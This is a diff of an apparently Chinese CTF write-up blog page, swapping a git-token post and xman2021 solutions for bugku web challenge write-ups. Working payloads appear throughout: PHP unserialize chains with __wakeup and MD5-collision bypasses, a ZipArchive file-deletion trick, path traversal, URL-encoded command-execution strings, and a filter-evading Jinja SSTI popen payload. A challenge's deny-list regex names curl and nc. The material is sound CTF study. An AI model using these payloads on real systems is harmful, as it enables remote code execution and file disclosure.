@@ -57,7 +57,7 @@
 	        
 				<li><a target="_blank" rel="noopener" href="https://ouroborosscr.github.io/2021/03/12/catalog/">wp目录</a></li>
 	        
-				<li><a href="/null">一些笔记</a></li>
+				<li><a href="/">一些笔记</a></li>
 	        
 				<li><a target="_blank" rel="noopener" href="https://ouroborosscr.github.io/2021/05/11/%E5%A4%A7%E4%BD%AC%E7%9A%84%E5%8D%9A%E5%AE%A2%E6%95%B4%E7%90%86/">大佬们的博客整理</a></li>
 	        
@@ -145,7 +145,7 @@
 		        
 					<li style="width: 25%"><a target="_blank" rel="noopener" href="https://ouroborosscr.github.io/2021/03/12/catalog/">wp目录</a></li>
 		        
-					<li style="width: 25%"><a href="/null">一些笔记</a></li>
+					<li style="width: 25%"><a href="/">一些笔记</a></li>
 		        
 					<li style="width: 25%"><a target="_blank" rel="noopener" href="https://ouroborosscr.github.io/2021/05/11/%E5%A4%A7%E4%BD%AC%E7%9A%84%E5%8D%9A%E5%AE%A2%E6%95%B4%E7%90%86/">大佬们的博客整理</a></li>
 		        
@@ -164,14 +164,14 @@
           <div id="js-content" class="content-ll">
             
   
-    <article id="post-个人令牌" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-bugku-web-noteasytrick" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/09/%E4%B8%AA%E4%BA%BA%E4%BB%A4%E7%89%8C/">git个人令牌</a>
+      <a class="article-title" href="/2021/08/12/bugku-web-noteasytrick/">bugku-web-noteasytrick</a>
     </h1>
   
 
@@ -179,30 +179,39 @@
         
 
 
-<a href="/2021/08/09/%E4%B8%AA%E4%BA%BA%E4%BB%A4%E7%89%8C/" class="archive-article-date">
-  	<time datetime="2021-08-09T07:48:05.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-09</time>
+<a href="/2021/08/12/bugku-web-noteasytrick/" class="archive-article-date">
+  	<time datetime="2021-08-12T04:08:02.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-12</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <hr>
-<h2 id="关于2021年8月13日后git不接受账号密码修改的应对"><a href="#关于2021年8月13日后git不接受账号密码修改的应对" class="headerlink" title="关于2021年8月13日后git不接受账号密码修改的应对"></a>关于2021年8月13日后git不接受账号密码修改的应对</h2><p>今天上传博客的时候，我在配置好ssh的情况下被要求输入账号和密码，并且接到这样一条邮件——</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">You recently used a password to access the repository at ouroborosscr&#x2F;ouroborosscr.github.io with git using git&#x2F;2.9.0.windows.1.</span><br><span class="line"></span><br><span class="line">Basic authentication using a password to Git is deprecated and will soon no longer work. Visit https:&#x2F;&#x2F;github.blog&#x2F;2020-12-15-token-authentication-requirements-for-git-operations&#x2F; for more information around suggested workarounds and removal dates.</span><br></pre></td></tr></table></figure>
-<p>意思是以后这种方法将会被弃用，原来的ssh都会因此而作废，这就导致市面上大多数hexo的教程可能会因此失效（毕竟将无法上传）<br>根据建议打开网站——<a target="_blank" rel="noopener" href="https://github.blog/2020-12-15-token-authentication-requirements-for-git-operations/">https://github.blog/2020-12-15-token-authentication-requirements-for-git-operations/</a></p>
-<p>了解到需要“个人访问令牌”，那就顺着流程做——<a target="_blank" rel="noopener" href="https://docs.github.com/en/github/authenticating-to-github/keeping-your-account-and-data-secure/creating-a-personal-access-token">https://docs.github.com/en/github/authenticating-to-github/keeping-your-account-and-data-secure/creating-a-personal-access-token</a></p>
-<p>其中，权限只选中repo就够了。</p>
-<p>跟着流程创建完之后，<code>git --verdion</code>检查一下自己git的版本，如果低于2.29，就下一个最新版安装——<a target="_blank" rel="noopener" href="https://github.com/git-for-windows/git/releases/tag/v2.32.0.windows.2">https://github.com/git-for-windows/git/releases/tag/v2.32.0.windows.2</a></p>
-<p>然后换https（这里只列举https，换git的方法差不多，但是这样的有一个好处是比ssh传输速度快很多），打开cmd（或git bush）输入git remote -v查看自己连接的库<br>如果报错，就是权限不够，先输一个git init，再输入<br>如果什么回显都没有，就是没有连接，直接输入<code>git remote add origin &quot;https://github.com/USERNAME/REPOSITORY.git&quot;</code><br>(记得改成自己的用户名和库名)<br>如果有类似</p>
-<figure class="highlight plain"><figcaption><span>git remote -v</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; origin  git@github.com:USERNAME&#x2F;REPOSITORY.git (fetch)</span><br><span class="line">&gt; origin  git@github.com:USERNAME&#x2F;REPOSITORY.git (push)</span><br></pre></td></tr></table></figure>
-<p>这样的回显，就输入<code>$ git remote set-url origin git@github.com:USERNAME/REPOSITORY.git</code>(记得改成自己的用户名和库名)</p>
-<p>然后输入git remote -v测试一下就行了<br>改后——</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ git remote -v</span><br><span class="line"># Verify new remote URL</span><br><span class="line">&gt; origin  https:&#x2F;&#x2F;github.com&#x2F;USERNAME&#x2F;REPOSITORY.git (fetch)</span><br><span class="line">&gt; origin  https:&#x2F;&#x2F;github.com&#x2F;USERNAME&#x2F;REPOSITORY.git (push)</span><br></pre></td></tr></table></figure>
+        <p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_53460654/article/details/116798346">https://blog.csdn.net/qq_53460654/article/details/116798346</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&quot;display_errors&quot;,&quot;Off&quot;);</span><br><span class="line">class Jesen &#123;</span><br><span class="line">    public $filename;</span><br><span class="line">    public $content;</span><br><span class="line">    public $me;</span><br><span class="line"></span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $this-&gt;me &#x3D; new Ctf();</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        $this-&gt;me-&gt;open($this-&gt;filename,$this-&gt;content);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Ctf &#123;</span><br><span class="line">    function __toString() &#123;</span><br><span class="line">        return &quot;die&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    function open($filename, $content)&#123;</span><br><span class="line">        if(!file_get_contents(&quot;.&#x2F;sandbox&#x2F;lock.lock&quot;))&#123;</span><br><span class="line">            echo file_get_contents(substr($_POST[&#39;b&#39;],0,30));</span><br><span class="line">            die();</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            file_put_contents(&quot;.&#x2F;sandbox&#x2F;&quot;.md5($filename.time()),$content);</span><br><span class="line">            die(&quot;or you can guess the final filename?&quot;); </span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!isset($_POST[&#39;a&#39;]))&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    die();</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    if(($_POST[&#39;b&#39;] !&#x3D; $_POST[&#39;a&#39;]) &amp;&amp; (md5($_POST[&#39;b&#39;]) &#x3D;&#x3D;&#x3D; md5($_POST[&#39;a&#39;])))&#123;</span><br><span class="line">        unserialize($_POST[&#39;c&#39;]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>之后在运行hexo d 的时候，明显传输速度直线上升</p>
-<p>后来发现，也可能是因为我原来用ssh传输太慢，可能某次修改的时候，把原来的ssh的库给换掉了，其实直接<code>git remote add origin &quot;git@github.com:USERNAME/REPOSITORY.git&quot;</code>也可以换回ssh，也能应付这种情况，但是问题是速度是真的慢，和被墙了一样</p>
+<p>先是一个md5碰撞，因为要利用b来传值，所以只能用碰撞</p>
+<p>为了绕过wakeup，还需要改元素数量使其不匹配</p>
+<p>因为<code>./sandbox/lock.lock</code>这个文件存在，而我们需要利用<code>echo file_get_contents(substr($_POST[&#39;b&#39;],0,30));</code>，所以必须把这个文件删掉</p>
+<p>这里利用ZipArchive 内置类的open方法达到删除文件效果</p>
+<p>令$filename = ‘./sandbox/lock.lock’;$content = 8;<br>（8应该是因为context的第八个是Zip context options，参考：<code>https://www.php.net/manual/zh/context.php</code>)<br>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Jesen &#123;</span><br><span class="line"></span><br><span class="line">    public $filename &#x3D; &#39;.&#x2F;sandbox&#x2F;lock.lock&#39;;</span><br><span class="line">    public $content &#x3D; 8;</span><br><span class="line">    public $me;&#125;</span><br><span class="line">$a &#x3D; new  Jesen();</span><br><span class="line">$zip  &#x3D; new  ZipArchive;</span><br><span class="line">$a-&gt;me &#x3D; $zip;</span><br><span class="line">$b &#x3D; serialize($a);</span><br><span class="line">$b &#x3D; str_replace(&#39;&quot;:3:&#39;,&#39;&quot;:4:&#39;,$b);</span><br><span class="line">echo $b;</span><br><span class="line">echo &quot;\n&quot;;</span><br></pre></td></tr></table></figure>
+<p>先上传```a[]=1&amp;b[]=2&amp;c=O:5:”Jesen”:4:{s:8:”filename”;s:19:”./sandbox/lock.lock”;s:7:”content”;i:8;s:2:”me”;O:10:”ZipArchive”:5:{s:6:”status”;i:0;s:9:”statusSys”;i:0;s:8:”numFiles”;i:0;s:8:”filename”;s:0:””;s:7:”comment”;s:0:””;}}</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">然后就是md5碰撞，因为要过滤掉b的前30个字节，所以可以传&#96;&#96;&#96;.&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</span><br></pre></td></tr></table></figure>
+<p>不过这样就不能找现成的碰撞了，多亏大佬给了一个很方便的工具——fastcoll：<a target="_blank" rel="noopener" href="https://www.zeroplace.cn/article.asp?id=886">https://www.zeroplace.cn/article.asp?id=886</a><br>不过不建议在那个网站安装，建议在官网<a target="_blank" rel="noopener" href="https://www.win.tue.nl/hashclash/">https://www.win.tue.nl/hashclash/</a></p>
+<p>得到1 _msg1.txt和1 _msg2.txt文件</p>
+<img src="/2021/08/12/bugku-web-noteasytrick/1.PNG" class="" title="1.PNG">
 
+<p>url编码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function readmyfile($path)&#123;</span><br><span class="line">    $fh&#x3D;fopen($path,&quot;rb&quot;);</span><br><span class="line">    $data&#x3D;fread($fh,filesize($path));</span><br><span class="line">    fclose($fh);</span><br><span class="line">    return$data;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;echo md5( (readmyfile(&quot;1.txt&quot;)));</span><br><span class="line">&#x2F;&#x2F;echo &#39;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#39;;</span><br><span class="line">echo urlencode(readmyfile(&quot;1.txt&quot;));</span><br><span class="line">&#x2F;&#x2F;echo md5( (readmyfile(&quot;2.txt&quot;)));</span><br><span class="line">echo &#39;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#39;;</span><br><span class="line">echo urlencode(readmyfile(&quot;2.txt&quot;));</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>构建一个凑数用的c：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Jesen&#123;</span><br><span class="line">    public$filename;</span><br><span class="line">    public$content;</span><br><span class="line">    public$me;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a &#x3D; new Jesen();</span><br><span class="line">echo serialize($a);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>最终payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
+<img src="/2021/08/12/bugku-web-noteasytrick/2.PNG" class="" title="2.PNG">
       
 
       
@@ -214,7 +223,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2021/08/09/%E4%B8%AA%E4%BA%BA%E4%BB%A4%E7%89%8C/">展开全文 >></a>
+          <a class="article-more-a" href="/2021/08/12/bugku-web-noteasytrick/">展开全文 >></a>
         </p>
       
 
@@ -266,14 +275,14 @@
     </section>
   
   
-    <article id="post-xman2021-easyphp" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-bugku-web-安慰奖" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/08/xman2021-easyphp/">xman2021-easyphp</a>
+      <a class="article-title" href="/2021/08/12/bugku-web-%E5%AE%89%E6%85%B0%E5%A5%96/">bugku-web-安慰奖</a>
     </h1>
   
 
@@ -281,27 +290,31 @@
         
 
 
-<a href="/2021/08/08/xman2021-easyphp/" class="archive-article-date">
-  	<time datetime="2021-08-08T12:15:25.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-08</time>
+<a href="/2021/08/12/bugku-web-%E5%AE%89%E6%85%B0%E5%A5%96/" class="archive-article-date">
+  	<time datetime="2021-08-12T03:46:40.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-12</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>dasctf的原题,就改了一下文件结构和类名</p>
-<p>源码——</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class XMAN&#123;</span><br><span class="line">    public $class;</span><br><span class="line">    public $para;</span><br><span class="line">    public $check;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;class &#x3D; &quot;Hel&quot;;</span><br><span class="line">        $this-&gt;para &#x3D; &quot;xctfer&quot;;</span><br><span class="line">        echo new  $this-&gt;class ($this-&gt;para);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;check &#x3D; new Filter;</span><br><span class="line">        if($this-&gt;check-&gt;vaild($this-&gt;para) &amp;&amp; $this-&gt;check-&gt;vaild($this-&gt;class)) &#123;</span><br><span class="line">            echo new  $this-&gt;class ($this-&gt;para);</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">            die(&#39;what?Really?&#39;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class Hel&#123;</span><br><span class="line">    var $a;</span><br><span class="line">    public function __construct($a)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;a &#x3D; $a;</span><br><span class="line">        echo (&quot;Hello bro, I guess you are a lazy &quot;.$this-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Filter&#123;</span><br><span class="line"></span><br><span class="line">    function vaild($code)&#123;</span><br><span class="line">        $pattern &#x3D; &#39;&#x2F;[!|@|#|$|%|^|&amp;|*|&#x3D;|\&#39;|&quot;|:|;|?]&#x2F;i&#39;;</span><br><span class="line">        if (preg_match($pattern, $code))&#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">            return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;xctf&#39;]))&#123;</span><br><span class="line">    unserialize($_GET[&#39;xctf&#39;]);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    $a&#x3D;new XMAN;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这句我一开始不太明白这句——</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo new  $this-&gt;class ($this-&gt;para);</span><br></pre></td></tr></table></figure>
-<p>然后搜了一下，结果就直接搜到原题了</p>
-<p>这句的意思是：$this-&gt;class函数的参数是$this-&gt;para</p>
-<p>所以payload——<br>用FilesystemIterator遍历目录(把/换成文件夹，直到找到要打开的文件夹)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class XMAN&#123;</span><br><span class="line">    public $class&#x3D;&#39;FilesystemIterator&#39;;</span><br><span class="line">    public $para&#x3D;&quot;&#x2F;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">$o  &#x3D; new XMAN();</span><br><span class="line">echo serialize($o);</span><br></pre></td></tr></table></figure>
+        <p>查看源代码，发现一个base64，解码后发现backups，没看懂是什么意思</p>
+<img src="/2021/08/12/bugku-web-%E5%AE%89%E6%85%B0%E5%A5%96/1.PNG" class="" title="1.PNG">
+<img src="/2021/08/12/bugku-web-%E5%AE%89%E6%85%B0%E5%A5%96/2.PNG" class="" title="2.PNG">
+<p>扫目录发现备份文件才明白那个backup大概是提示的这个</p>
+<img src="/2021/08/12/bugku-web-%E5%AE%89%E6%85%B0%E5%A5%96/3.PNG" class="" title="3.PNG">
 
-<p>用SplFileObject读取文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class XMAN&#123;</span><br><span class="line">    public $class&#x3D;&#39;SplFileObject&#39;;</span><br><span class="line">    public $para &#x3D; &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;xxxXXXmMManNNn&#x2F;f1a4.php&#39;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a &#x3D; new XMAN();</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>
+<p>文件打开后是php源码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">header(&quot;Content-Type: text&#x2F;html;charset&#x3D;utf-8&quot;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">echo &quot;&lt;!-- YmFja3Vwcw&#x3D;&#x3D; --&gt;&quot;;</span><br><span class="line">class ctf</span><br><span class="line">&#123;</span><br><span class="line">    protected $username &#x3D; &#39;hack&#39;;</span><br><span class="line">    protected $cmd &#x3D; &#39;NULL&#39;;</span><br><span class="line">    public function __construct($username,$cmd)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;username &#x3D; $username;</span><br><span class="line">        $this-&gt;cmd &#x3D; $cmd;</span><br><span class="line">    &#125;</span><br><span class="line">    function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;username &#x3D; &#39;guest&#39;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        if(preg_match(&quot;&#x2F;cat|more|tail|less|head|curl|nc|strings|sort|echo&#x2F;i&quot;, $this-&gt;cmd))</span><br><span class="line">        &#123;</span><br><span class="line">            exit(&#39;&lt;&#x2F;br&gt;flag能让你这么容易拿到吗？&lt;br&gt;&#39;);</span><br><span class="line">        &#125;</span><br><span class="line">        if ($this-&gt;username &#x3D;&#x3D;&#x3D; &#39;admin&#39;)</span><br><span class="line">        &#123;</span><br><span class="line">           &#x2F;&#x2F; echo &quot;&lt;br&gt;right!&lt;br&gt;&quot;;</span><br><span class="line">            $a &#x3D; &#96;$this-&gt;cmd&#96;;</span><br><span class="line">            var_dump($a);</span><br><span class="line">        &#125;else</span><br><span class="line">        &#123;</span><br><span class="line">            echo &quot;&lt;&#x2F;br&gt;给你个安慰奖吧，hhh！&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    $select &#x3D; $_GET[&#39;code&#39;];</span><br><span class="line">    $res&#x3D;unserialize(@$select);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
+<p>反序化题，没有过滤tac和ls</p>
+<p>payload(因为这道题涉及protected，所以反序化后会有空字符，必须用url编码）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class ctf</span><br><span class="line">&#123;</span><br><span class="line">	protected $username &#x3D; &#39;admin&#39;;</span><br><span class="line">    protected $cmd &#x3D; &#39;[shell]&#39;;</span><br><span class="line">&#125;</span><br><span class="line">$a&#x3D;new ctf;</span><br><span class="line">echo urlencode(serialize($a));</span><br></pre></td></tr></table></figure>
+
+<p>还需要绕过wakeup（不然就会变成guest），当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行，所以还需要把2改成3。</p>
+<p>最终payload：<br>ls：<code>?code=O%3A3%3A%22ctf%22%3A3%3A%7Bs%3A11%3A%22%00%2A%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A6%3A%22%00%2A%00cmd%22%3Bs%3A2%3A%22ls%22%3B%7D</code></p>
+<p>tac flag.php:<code>?code=O%3A3%3A%22ctf%22%3A3%3A%7Bs%3A11%3A%22%00%2A%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A6%3A%22%00%2A%00cmd%22%3Bs%3A12%3A%22tac+flag.php%22%3B%7D</code></p>
+<img src="/2021/08/12/bugku-web-%E5%AE%89%E6%85%B0%E5%A5%96/4.PNG" class="" title="4.PNG">
       
 
       
@@ -313,7 +326,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2021/08/08/xman2021-easyphp/">展开全文 >></a>
+          <a class="article-more-a" href="/2021/08/12/bugku-web-%E5%AE%89%E6%85%B0%E5%A5%96/">展开全文 >></a>
         </p>
       
 
@@ -365,14 +378,14 @@
     </section>
   
   
-    <article id="post-xman2021-easyssti" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-bugku-web-file-get-contents" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/08/xman2021-easyssti/">xman2021-easyssti</a>
+      <a class="article-title" href="/2021/08/12/bugku-web-file-get-contents/">bugku-web-file_get_contents</a>
     </h1>
   
 
@@ -380,20 +393,20 @@
         
 
 
-<a href="/2021/08/08/xman2021-easyssti/" class="archive-article-date">
-  	<time datetime="2021-08-08T11:58:38.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-08</time>
+<a href="/2021/08/12/bugku-web-file-get-contents/" class="archive-article-date">
+  	<time datetime="2021-08-12T03:39:26.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-12</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>gwctf2019的原题，现在也可以在buuctf上做——<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[GWCTF%202019]%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97">https://buuoj.cn/challenges#[GWCTF%202019]%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97</a></p>
-<p>虽然网上很多都在用curl ip端口的方法，不过那个方法我怎么都没复现出来。</p>
-<p>还好找到这个大佬的做法——<a target="_blank" rel="noopener" href="https://johnfrod.top/uncategorized/gwctf-2019%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97/">https://johnfrod.top/uncategorized/gwctf-2019%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97/</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload——&#123;%print lipsum.__globals__[&#39;__bui&#39;+&#39;ltins__&#39;][&#39;__im&#39;+&#39;port__&#39;](&#39;o&#39;+&#39;s&#39;)[&#39;po&#39;+&#39;pen&#39;](&#39;whoami&#39;).read()%&#125;</span><br></pre></td></tr></table></figure>
-<p>然后把whoami换成ls之类的shell指令就行</p>
-<img src="/2021/08/08/xman2021-easyssti/1.PNG" class="" title="1.PNG">
